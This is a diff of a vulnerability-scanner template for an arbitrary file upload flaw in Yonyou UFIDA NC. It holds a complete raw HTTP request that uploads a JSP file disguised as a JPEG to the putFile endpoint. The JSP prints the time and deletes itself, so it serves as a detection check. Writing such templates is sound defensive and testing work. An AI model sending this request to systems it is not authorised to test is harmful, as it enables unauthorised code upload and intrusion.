@@ -3,17 +3,11 @@ info:
   name: 用友UFIDANCputFile存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/8aff69ddc0b980d42d58fbe7f8e11d67
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 8aff69ddc0b980d42d58fbe7f8e11d67
-    fofa: + hunter`app.name="用友 UFIDA NC"`
 http:
 - raw:
-  - "POST /portal/file?cmd=putFile&pk_org=1 HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 1010\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryUscir5wae6fGsk4f\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nCookie: JSESSIONID=4CE4F022D21FE883F86C892F25CFFA69; JSESSIONID=323578C1A50D1E687A0AB7434C16485F\nConnection: close\n\n------WebKitFormBoundaryUscir5wae6fGsk4f\nContent-Disposition: form-data; name=\"pic\"; filename=\"1.jsp\"\nContent-Type: image/jpeg\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>\n<%\n    // 获取当前时间\n    java.util.Date currentTime = new java.util.Date();\n    String currentTimeString = currentTime.toString();\n\n    // 输出当前时间\n    out.println(currentTimeString);\n\n    // 删除当前文件\n    java.io.File file = new java.io.File(request.getRealPath(request.getServletPath()));\n    file.delete();\n%>\n\n\n------WebKitFormBoundaryUscir5wae6fGsk4f\nContent-Disposition: form-data; name=\"style\"\n\nfile\n------WebKitFormBoundaryUscir5wae6fGsk4f\nContent-Disposition: form-data; name=\"source\"\n\n\n------WebKitFormBoundaryUscir5wae6fGsk4f\nContent-Disposition: form-data; name=\"identifier\"\n\ncompdoc_123\n------WebKitFormBoundaryUscir5wae6fGsk4f\nContent-Disposition: form-data; name=\"pkfile\"\n\n\n------WebKitFormBoundaryUscir5wae6fGsk4f--"
+  - "POST /portal/file?cmd=putFile&pk_org=1 HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 1010\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryUscir5wae6fGsk4f\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nCookie: JSESSIONID=4CE4F022D21FE883F86C892F25CFFA69; JSESSIONID=323578C1A50D1E687A0AB7434C16485F\nConnection: close\n\n------WebKitFormBoundaryUscir5wae6fGsk4f\nContent-Disposition: form-data; name=\"pic\"; filename=\"1.jsp\"\nContent-Type: image/jpeg\n\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>\n<%\n    // 获取当前时间\n    java.util.Date currentTime = new java.util.Date();\n    String currentTimeString = currentTime.toString();\n\n    // 输出当前时间\n    out.println(currentTimeString);\n\n    // 删除当前文件\n    java.io.File file = new java.io.File(request.getRealPath(request.getServletPath()));\n    file.delete();\n%>\n\n------WebKitFormBoundaryUscir5wae6fGsk4f\nContent-Disposition: form-data; name=\"style\"\n\nfile\n------WebKitFormBoundaryUscir5wae6fGsk4f\nContent-Disposition: form-data; name=\"source\"\n\n------WebKitFormBoundaryUscir5wae6fGsk4f\nContent-Disposition: form-data; name=\"identifier\"\n\ncompdoc_123\n------WebKitFormBoundaryUscir5wae6fGsk4f\nContent-Disposition: form-data; name=\"pkfile\"\n\n------WebKitFormBoundaryUscir5wae6fGsk4f--"
   redirects: false
   matchers:
   - status:
